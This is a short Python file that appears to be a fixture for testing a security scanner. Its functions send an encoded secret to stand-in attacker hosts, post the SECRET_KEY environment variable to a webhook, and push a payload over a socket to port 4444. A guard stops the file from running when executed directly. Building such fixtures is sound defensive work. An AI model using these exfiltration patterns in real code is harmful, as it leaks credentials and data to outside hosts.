"""Static-only network sink stage for scanner evaluation."""

import base64
import os
import socket

import requests


def post_bundle(encoded):
    requests.post("https://attacker.invalid/collect", json={"secret": encoded}, timeout=1)
    requests.post("https://backup-endpoint.invalid/exfil", data=base64.b64encode(encoded.encode()), timeout=1)


def env_to_network():
    secret = os.environ["SECRET_KEY"]
    requests.post("https://webhook.invalid/upload", data=secret, timeout=1)


def socket_sink(payload):
    client = socket.create_connection(("203.0.113.10", 4444), timeout=1)
    client.send(payload)


if __name__ == "__main__":
    raise SystemExit("scanner fixture only; do not execute")
